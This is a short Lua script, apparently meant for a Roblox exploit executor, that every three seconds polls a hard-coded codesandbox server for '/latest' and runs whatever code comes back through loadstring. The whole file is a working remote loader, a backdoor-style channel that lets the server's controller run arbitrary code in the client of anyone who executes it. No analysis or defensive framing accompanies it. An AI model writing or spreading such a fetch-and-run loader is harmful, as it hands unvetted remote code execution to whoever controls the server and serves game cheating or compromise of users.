local HttpService = game:GetService("HttpService")

local SERVER = "https://jn5t96-3000.csb.app"
local lastScriptHash = nil

-- Script execution polling
local function checkScript()
    local success, res = pcall(function()
        return request({
            Url = SERVER .. "/latest",
            Method = "GET"
        })
    end)

    if success and res.Success then
        local content = res.Body
        local currentHash = HttpService:JSONEncode(content)
        if currentHash ~= lastScriptHash then
            lastScriptHash = currentHash
            local fn, err = loadstring(content)
            if fn then
                local ok, execErr = pcall(fn)
                if not ok then
                    warn("[Script] Runtime error:", execErr)
                end
            else
                warn("[Script] Load error:", err)
            end
        end
    else
        warn("[Script] Failed to get latest.lua:", res.StatusMessage)
    end
end

-- Start polling script every 3 seconds
task.spawn(function()
    while true do
        checkScript()
        task.wait(3)
    end
end)
